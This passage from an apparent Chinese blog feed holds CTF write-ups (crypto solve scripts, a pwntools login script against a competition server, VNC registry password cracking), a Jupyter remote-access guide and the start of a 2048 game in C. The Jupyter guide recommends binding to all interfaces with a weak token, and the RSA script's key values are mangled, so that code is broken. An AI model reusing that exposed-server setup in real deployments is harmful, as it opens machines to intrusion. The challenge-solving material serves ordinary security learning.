keys.append(strToarr(tipses))</span><br><span class="line">        self.keys = keys</span><br><span class="line">        result = list()</span><br><span class="line">        bok = strToarr(part_encode)</span><br><span class="line">        g, d = nsp(bok, 32)</span><br><span class="line">        d, g = nsp(bok, 32)</span><br><span class="line"></span><br><span class="line">        tipses = None</span><br><span class="line">        for i in range(16):</span><br><span class="line">            if i &lt; aRound:</span><br><span class="line">                continue</span><br><span class="line">            de = self.perm(d, Enc)</span><br><span class="line">            tipses = self.yh(self.keys[15-i], de)</span><br><span class="line">            tipses = self.subtses(tipses)</span><br><span class="line">            tipses = self.perm(tipses, P)</span><br><span class="line">            tipses = self.yh(g, tipses)</span><br><span class="line">            g = d</span><br><span class="line">            d = tipses</span><br><span class="line">        result += self.perm(d+g, PAI)</span><br><span class="line">        final_res = arrTostr(result)</span><br><span class="line">        return final_res</span><br><span class="line">    def subtses(self, de):</span><br><span class="line">        subbs = nsp(de, 6)</span><br><span class="line">        r = list()</span><br><span class="line">        for i in range(len(subbs)):</span><br><span class="line">            bok = subbs[i]</span><br><span class="line">            row = int(str(bok[0])+str(bok[5]),2)</span><br><span class="line">            col = int(&apos;&apos;.join([str(x) for x in bok[1:][:-1]]),2)</span><br><span class="line">            val = SBES[i][row][col]</span><br><span class="line">            bin = b(val, 4)</span><br><span class="line">            r += [int(x) for x in bin]</span><br><span class="line">        return r</span><br><span class="line">    def perm(self, b, t):</span><br><span class="line">        return [b[x-1] for x in t]</span><br><span class="line">    def yh(self, b, t):</span><br><span class="line">        return [x^y for x,y in zip (b,t)]</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d = SimpleDes()</span><br><span class="line">    res = d.test(3)</span><br><span class="line">    print &quot;flag&#123;%s&#125;&quot;%res</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p> flag{y0ur9Ood}</p>
<h3 id="0x03-warmup"><a href="#0x03-warmup" class="headerlink" title="0x03  warmup"></a>0x03  warmup</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">plstr = &apos;asdfghjklqwertyuiopasdfghjklzxdfgjfdjdfdjsrtjwsrtjwrjwjhwrcv&apos;</span><br><span class="line">cistr = &apos;554796a8bcd5ebdbbb16bf0988e124282d7ef4ec8136e7cbd5f49219801af2355a2a59cc445b7e8c95366fad7275b243e0e87534fe84230412946846a3fca15737d6a646cf67b45278641b058766b93ba1b4bdd5cca0d5a18edf01b7a8b56edfbf96d2e491c5ad9a788ffd418818dab0&apos;</span><br><span class="line">kstr = map(lambda s: s[0] ^ s[1], zip(map(ord, binascii.unhexlify(cistr)), map(ord, plstr)))</span><br><span class="line">Tcstr = map(ord,binascii.unhexlify(&apos;525893a9a084b186e406fa5acdb86f682574a9b9c733b28184fdcf10d754a4300d255d994a5d2a8dc6381bdf1e04c737&apos;))</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">print len(kstr)</span><br><span class="line">for i in xrange(len(Tcstr)):</span><br><span class="line">    if i &gt;= len(kstr):</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        result += chr(Tcstr[i] ^ kstr[i])</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag{9063a267-25ae-45a3-9c6e-62c0eb1db2e9}</p>
<h3 id="0x04-Asymmetric"><a href="#0x04-Asymmetric" class="headerlink" title="0x04  Asymmetric"></a>0x04  Asymmetric</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2</span><br><span class="line">import codecs</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">num1=longspan><br><span class="line"></span><br><span class="line">num2=longspan><br><span class="line"></span><br><span class="line">num3=long(165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867)</span><br><span class="line"></span><br><span class="line">a1=long(num3**2)</span><br><span class="line">a2=long(num3**2)</span><br><span class="line">c=long(gmpy2.invert(num2,a1**2*(a1-1)))</span><br><span class="line"></span><br><span class="line">d=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&quot;</span><br><span class="line"></span><br><span class="line">d=base64.b64decode(d)</span><br><span class="line">d=d.encode(&apos;hex&apos;)</span><br><span class="line">d=int(d,16)</span><br><span class="line">e=hex(pow(d,c,num1))[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">if(len(e)%2==1):</span><br><span class="line">    m=&apos;0&apos;+e</span><br><span class="line">print e.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p> flag{ec33f669d2d659e2bc27dbffdfeb0f38}</p>
<p># </p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="0x01-easyGo"><a href="#0x01-easyGo" class="headerlink" title="0x01  easyGo"></a>0x01  easyGo</h3><figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>使用gdb单步步过,向下执行,直到出现flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} </p>
<h3 id="0x02-bbvvmm"><a href="#0x02-bbvvmm" class="headerlink" title="0x02  bbvvmm"></a>0x02  bbvvmm</h3><p>在虚拟机中单步跟踪调试，发现在sub_4051E3中将输入的密码写入了图中位置<figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>旁边可看见正确的密码 xyz{|}<br>RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=<br>base64换码表之后解码得到<br>0xEF,0x46,0x8D,0xBA,0xF9,0x85,0xB2,0x50,0x9C,0x9E,0x20,0x0C,0xF3,0x52,0x5A,0xB6<br>然后根据这个网站<a href="http://www.sitcoder.com/?post=60" target="_blank" rel="noopener">http://www.sitcoder.com/?post=60</a>解密SM4得到用户名 badrer12。<br>由于password处回车会导致溢出，程序没有回显，所以在password只send数据，就可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">id = remote(&apos;39.106.224.151&apos;, 10001)</span><br><span class="line">print id.recv()</span><br><span class="line">id.sendline(&apos;badrer12&apos;)</span><br><span class="line">print id.recv()</span><br><span class="line">id.send(&apos;xyz&#123;|&#125;&apos;)</span><br><span class="line">print id.recv()</span><br><span class="line">id.close()</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./30.png" alt="图片" title class>
                <p>图片</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019安恒七月月赛 misc wp]]></title>
      <url>/ctf-writeup-misc/ckwd5ws5v0007d0ucihynjmnm/</url>
      <content type="html"><![CDATA[<h2 id="0x01-真正的CTFer"><a href="#0x01-真正的CTFer" class="headerlink" title="0x01  真正的CTFer"></a>0x01  真正的CTFer</h2><p>通过简单的计算改了下宽高<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>在下一张图片里看到一个很隐蔽的flag<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br> flag{d2b5543c2f8aa8229057872dd85ce5a9}</p>
<h2 id="0x02-解不开的秘密"><a href="#0x02-解不开的秘密" class="headerlink" title="0x02  解不开的秘密"></a>0x02  解不开的秘密</h2><p>解压得到docx文件和file文件,file文件是一串hex,转ascil码后是一串base64,解码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\vnclicensewiz]</span><br><span class="line">&quot;_AnlClientId&quot;=&quot;8f5cc378-2e1d-4670-80e0-d2d81d882561&quot;</span><br><span class="line">&quot;_AnlSelected&quot;=&quot;0&quot;</span><br><span class="line">&quot;_AnlInclRate&quot;=&quot;0.0025&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\vncserver]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4]</span><br><span class="line">&quot;dummy&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4\MRU]</span><br><span class="line">&quot;00&quot;=&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Order&quot;=hex:00,01</span><br><span class="line">&quot;01&quot;=&quot;127.0.0.1:5900&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\RealVNC\WinVNC4]</span><br><span class="line">&quot;Password&quot;=hex:37,5e,be,86,70,b3,c6,f3</span><br><span class="line">&quot;SecurityTypes&quot;=&quot;VncAuth&quot;</span><br><span class="line">&quot;ReverseSecurityTypes&quot;=&quot;None&quot;</span><br><span class="line">&quot;QueryConnect&quot;=dword:00000000</span><br><span class="line">&quot;PortNumber&quot;=dword:0000170c</span><br><span class="line">&quot;LocalHost&quot;=dword:00000000</span><br><span class="line">&quot;IdleTimeout&quot;=dword:00000e10</span><br><span class="line">&quot;HTTPPortNumber&quot;=dword:000016a8</span><br><span class="line">&quot;Hosts&quot;=&quot;+,&quot;</span><br><span class="line">&quot;AcceptKeyEvents&quot;=dword:00000001</span><br><span class="line">&quot;AcceptPointerEvents&quot;=dword:00000001</span><br><span class="line">&quot;AcceptCutText&quot;=dword:00000001</span><br><span class="line">&quot;SendCutText&quot;=dword:00000001</span><br><span class="line">&quot;DisableLocalInputs&quot;=dword:00000000</span><br><span class="line">&quot;DisconnectClients&quot;=dword:00000001</span><br><span class="line">&quot;AlwaysShared&quot;=dword:00000000</span><br><span class="line">&quot;NeverShared&quot;=dword:00000000</span><br><span class="line">&quot;DisconnectAction&quot;=&quot;None&quot;</span><br><span class="line">&quot;RemoveWallpaper&quot;=dword:00000000</span><br><span class="line">&quot;RemovePattern&quot;=dword:00000000</span><br><span class="line">&quot;DisableEffects&quot;=dword:00000000</span><br><span class="line">&quot;UseHooks&quot;=dword:00000001</span><br><span class="line">&quot;PollConsoleWindows&quot;=dword:00000001</span><br><span class="line">&quot;CompareFB&quot;=dword:00000001</span><br><span class="line">&quot;Protocol3.3&quot;=dword:00000000</span><br><span class="line">&quot;dummy&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure></p>
<p>得到注册表,存放着vnc server的密码,破解得到<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>解密docx,把图片挪开,改字体黑色,得到flag<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>嗯记得去掉flag{}提交<br>aec1294a146b8ece1e3a295e557e198c</p>
<h2 id="0x03-三行代码抵挡服务器攻击"><a href="#0x03-三行代码抵挡服务器攻击" class="headerlink" title="0x03  三行代码抵挡服务器攻击"></a>0x03  三行代码抵挡服务器攻击</h2><p>按照节目里的三行代码<br><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>得到flag<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure><br> flag{hyt_p1ay_CTF_l1k3_y0u} </p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Jupyter Notebook 在浏览器中运行代码交互]]></title>
      <url>/%E5%B7%A5%E5%85%B7/ckwd5ws8a0034d0ucbkgorsyp/</url>
      <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install jupyter  //使用python环境搭建的一个在线浏览器代码交互环境</span><br><span class="line">jupyter notebook    //除默认文件夹外,想在哪个文件夹打开就在哪个文件夹内cmd 输入这行命令</span><br><span class="line">jupyter notebook --allow-root  //在服务器上要以root权限运行</span><br><span class="line">jupyter notebook --no-browser --port=8889  //访问指定端口</span><br></pre></td></tr></table></figure>
<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><p>new 里按照安装的内核可以新建对应语言的notebook</p>
<figure class="image-box">
                <img src="./1.jpg" alt="图片" title class>
                <p>图片</p>
            </figure>
<h3 id="notebook-界面由以下部分组成："><a href="#notebook-界面由以下部分组成：" class="headerlink" title="notebook 界面由以下部分组成："></a>notebook 界面由以下部分组成：</h3><ol>
<li>notebook 的名称</li>
<li>主工具栏，提供了保存、导出、重载 notebook，以及重启内核等选项</li>
<li>快捷键</li>
<li>notebook 主要区域，包含了 notebook 的内容编辑区</li>
</ol>
<p>每个 notebook 由多个单元格构成，而每个单元格又可以有不同的用途</p>
<p>比如在python的notebook里新建一个cell,可以是代码cell,也可以是md语言的cell,适当搭配可以使页面美观</p>
<p>Jupyter Notebook 支持修改之前的单元格而使整个代码发生改变,而每个单元格又可以单独执行和计算</p>
<p>MarkDown 单元格支持HTML语法,也支持可以插入数学公式的 LaTex 语法</p>
<figure class="image-box">
                <img src="./2.jpg" alt="图片" title class>
                <p>图片</p>
            </figure>
<h3 id="巧用命令"><a href="#巧用命令" class="headerlink" title="巧用命令"></a>巧用命令</h3><p>Cell -&gt; Run all  可以重新计算整个notebook<br>Insert -&gt; Insert单元格above  在上方插入单元格<br>Edit -&gt; Delete Cell  删除某个cell(单元格)<br>Edit -&gt; Move cell up/down  移动某个单元格<br>Edit -&gt; Cut Cell  剪切cell<br>Edit -&gt; Paste Cell Above/Below  粘贴cell<br>Edit -&gt; Merge Cell Above/below  如果notebook中有很多cell只需要执行一次，或者想一次性执行大段代码，那么可以选择合并这些cell</p>
<h3 id="导出功能"><a href="#导出功能" class="headerlink" title="导出功能"></a>导出功能</h3><p>Jupyter Notebook 导出文件时可以选择不同格式</p>
<p>比如:<br>HTML<br>Markdown<br>ReST<br>PDF（通过 LaTeX）<br>Raw Python</p>
<p>导出 PDF 功能，可以不用写 LaTex 即可创建漂亮的 PDF 文档</p>
<p>还可以将 notebook 作为网页发布在网站</p>
<p>甚至可以导出为 ReST 格式，作为软件库的文档</p>
<h3 id="matplotlib集成"><a href="#matplotlib集成" class="headerlink" title="matplotlib集成"></a>matplotlib集成</h3><p>Jupyter notebook 还集成了 matplotlib 库</p>
<p>要想在 Jupyter notebook 中使用 matplotlib，需要告诉 Jupyter 获取 matplotlib 生成的所有图形，并将其嵌入 notebook 中</p>
<p>为此，需要计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br></pre></td></tr></table></figure></p>
<p>当然,需要先安装本地库才能使用  <code>pip install matplotlib</code></p>
<h3 id="非本地内核远程访问"><a href="#非本地内核远程访问" class="headerlink" title="非本地内核远程访问"></a>非本地内核远程访问</h3><h4 id="方法一-ssh远程使用jupyter-notebook"><a href="#方法一-ssh远程使用jupyter-notebook" class="headerlink" title="方法一:ssh远程使用jupyter notebook"></a>方法一:ssh远程使用jupyter notebook</h4><p>在远程服务器上，启动jupyter notebooks服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --no-browser --port=8889</span><br></pre></td></tr></table></figure>
<p>在本地终端中启动SSH：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L localhost:8888:localhost:8889 username@serverIP</span><br></pre></td></tr></table></figure>
<p>其中： -N 告诉SSH没有命令要被远程执行； -f 告诉SSH在后台执行； -L 是指定port forwarding的配置，远端端口是8889，本地的端口号的8888。</p>
<p>注意：username@serverIP替换成服务器的对应账号。</p>
<p>最后打开浏览器，访问：<a href="http://localhost:8888/" target="_blank" rel="noopener">http://localhost:8888/</a></p>
<h4 id="方法二-利用jupyter-notebook自带的远程访问功能"><a href="#方法二-利用jupyter-notebook自带的远程访问功能" class="headerlink" title="方法二:利用jupyter notebook自带的远程访问功能"></a>方法二:利用jupyter notebook自带的远程访问功能</h4><p>官方指南在此：<a href="https://jupyter-notebook.readthedocs.io/en/latest/public_server.html#notebook-server-security" target="_blank" rel="noopener">官方指南</a></p>
<p>生成默认配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure>
<p>生成访问密码(token)<br>终端输入ipython，设置你自己的jupyter访问密码，注意复制输出的sha1:xxxxxxxx密码串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [1]: from notebook.auth import passwd</span><br><span class="line">In [2]: passwd()</span><br><span class="line">Enter password:</span><br><span class="line">Verify password:</span><br><span class="line">Out[2]: &apos;sha1:xxxxxxxxxxxxxxxxx&apos;</span><br></pre></td></tr></table></figure>
<p>修改./jupyter/jupyter_notebook_config.py中对应行如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c.NotebookApp.ip=&apos;*&apos;</span><br><span class="line">c.NotebookApp.password = u&apos;sha:ce...刚才复制的那个密文&apos;</span><br><span class="line">c.NotebookApp.open_browser = False</span><br><span class="line">c.NotebookApp.port =8888 #可自行指定一个端口, 访问时使用该端口</span><br></pre></td></tr></table></figure>
<p>在服务器上启动jupyter notebook</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>
<p>最后打开浏览器，访问：<a href="http://ip:8888/" target="_blank" rel="noopener">http://ip:8888/</a></p>
<h4 id="方法三-通过命令行设置临时访问-我用这个-稳得一匹"><a href="#方法三-通过命令行设置临时访问-我用这个-稳得一匹" class="headerlink" title="方法三:通过命令行设置临时访问(我用这个,稳得一匹)"></a>方法三:通过命令行设置临时访问(我用这个,稳得一匹)</h4><p>配置文件如方法二</p>
<p>命令行里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter-notebook --ip=*</span><br></pre></td></tr></table></figure>
<p>开启远程访问,此时localhost和远程不能同时进行,本机用户可以使用主机名或127.0.0.1与远程服务器协作,远程用户可以通过IP和token访问,同时开启服务的本机能监控操作和访问流量</p>
<h4 id="方法四-指定token访问-在divint3指点下发现"><a href="#方法四-指定token访问-在divint3指点下发现" class="headerlink" title="方法四:指定token访问(在divint3指点下发现)"></a>方法四:指定token访问(在divint3指点下发现)</h4><p>在<code>jupyter_notebook_config.py</code>中的<code>c.NotebookApp.token</code>选项,当没有设置password时可以通过指定的token(比如弱口令密码)进行远程访问,虽然安全性不高但是从某种意义上来说还算便捷</p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[c语言 2048游戏]]></title>
      <url>/%E7%A8%8B%E5%BA%8F/ckwd5ws8z0049d0uct7v5fp6p/</url>
      <content type="html"><![CDATA[<h2 id="大一夏学期暑假c语言实训作业"><a href="#大一夏学期暑假c语言实训作业" class="headerlink" title="大一夏学期暑假c语言实训作业"></a>大一夏学期暑假c语言实训作业</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>程序将使用windows平台,采用预编译(条件编译)的形式防止重编译,使用二维数组、键盘读取、生成随机种子、光标位置控制等知识点实现2048游戏的完整功能,需要控制所有方块向同一个方向运动,两个相同数字的方块撞在一起之后合并成为他们的和,每次操作之后会在空白的方格处随机生成一个2或者4(生成2的概率要大一些）,最终得到一个“2048”的方块就算胜利.</p>
<h3 id="核心算法（理论知识这部分是引用了网上的资料）"><a href="#核心算法（理论知识这部分是引用了网上的资料）" class="headerlink" title="核心算法（理论知识这部分是引用了网上的资料）"></a>核心算法（理论知识这部分是引用了网上的资料）</h3><h4 id="方块的移动和合并"><a href="#方块的移动和合并" class="headerlink" title="方块的移动和合并"></a>方块的移动和合并</h4><p>把游戏数字面板抽象成4行4列的二维数组a[4][4]，值为0的位置表示空方块，其他表示对应数字方块。把每一行同等对待，只研究一行的移动和合并算法，然后可以通过遍历行来实现所有行的移动合并算法。在一行中，用b[4]表示一行的一维数组，使用两个下标变量来遍历列项，这里使用j和k，其中j总在k的后面，用来寻找k项后面第一个不为0的数字，而k项用于表示当前待比较的项，总是和j项之间隔着若干个数字0，或者干脆紧挨着。</p>
<p>不失一般性，考虑往左滑动时，初始情况下j等于1，而k等于0，接着判断j项数字是否大于0，若是，则判断j项和k项数字的关系，分成3种情况处理，分别是（合并）P1: b[k]==b[j]，（移动）P2: b[k]==0和（碰撞）P3: b[k]!=0且b[k]!=b[j]；若否，则j自加1，然后继续寻找k项后面第一个不为0的数字。</p>
<p>其中P1，P2和P3分别对应如下：</p>
<p>（合并）P1：b[k]==b[j]，则b[k] = 2 * b[k]（说明两数合并了），且b[j] = 0（合并之后要将残留的j项值清零），接着k自加1，然后进行下一次循环。</p>
<p>（移动）P2：b[k]==0，则表示b[j]之前全是空格子，此时直接移动b[j]到k的位置，也就是b[k] = b[j]，然后b[j] = 0（移动后将残留的j项值清零），接着k值不变，然后进行下一次循环。</p>
<p>（碰撞）P3：b[k]!=0且b[k]!=b[j]，则表示两数不相等且都不为0，此时将两数靠在一起，也就是b[k+1] = b[j]。接着分两种小情况，若j!=k+1，则b[j] = 0（移动后将残留的j项值清零）；若否，则表示两数原先就靠在一起，则不进行特殊处理（相当于未移动）。接着k自加1，然后进行下一次循环。</p>
<h4 id="判断游戏是否结束"><a href="#判断游戏是否结束" class="headerlink" title="判断游戏是否结束"></a>判断游戏是否结束</h4><p>遍历二维数组，看是否存在横向和纵向两个相邻的元素相等，若存在，则游戏不结束，若不存在，则游戏结束。</p>
<h4 id="生成随机数"><a href="#生成随机数" class="headerlink" title="生成随机数"></a>生成随机数</h4><p>根据生成的随机数，对一定的值进行取模，达到生成一定概率的数。在本游戏中，设定4出现的概率为1/10，于是可以利用系统提供的随机数函数生成一个数，然后对10取余，得到的数若大于0则在游戏面板空格处生成一个2，若余数等于0，则生成4。在选择将在哪一个空格出生成数的时候，也是根据系统提供的随机函数生成一个数，然后对空格数取余，然后在第余数个空格出生成数字。</p>
<h4 id="绘制界面"><a href="#绘制界面" class="headerlink" title="绘制界面"></a>绘制界面</h4><p>利用系统提供的控制台界面清屏功能，达到刷新界面的效果，利用控制制表符位置，达到绘制游戏数字面板的效果。</p>
<h4 id="计算得分"><a href="#计算得分" class="headerlink" title="计算得分"></a>计算得分</h4><p>两块带数字的方格合并后的数字为合并的得分，一次上下左右移动后游戏面板上所有合并的得分总和为一次移动的得分，多次移动的得分进行累加作为当前总得分。</p>
<p>如果当前总得分（SCORE）超过最高分（BEST），则最高分被改写为当前总得分，并存储下来，下次启动游戏时会自动载入本机存储的最高分。</p>
<h3 id="各部分实现"><a href="#各部分实现" class="headerlink" title="各部分实现"></a>各部分实现</h3><p>主函数中定义了游戏的大体框架.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	system(<span class="string">"color F1"</span>);<span class="comment">//修改界面颜色,第一位前景色,第二位背景色</span></span><br><span class="line">    init_game();<span class="comment">//初始化游戏 </span></span><br><span class="line">    loop_game();<span class="comment">//游戏循环 </span></span><br><span class="line">    release_game(<span class="number">0</span>);<span class="comment">//重置游戏 </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="读取键盘操作"><a href="#读取键盘操作" class="headerlink" title="读取键盘操作"></a>读取键盘操作</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_keyboard</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">    <span class="keyword">return</span> _getch();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">int</span> key_code;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, 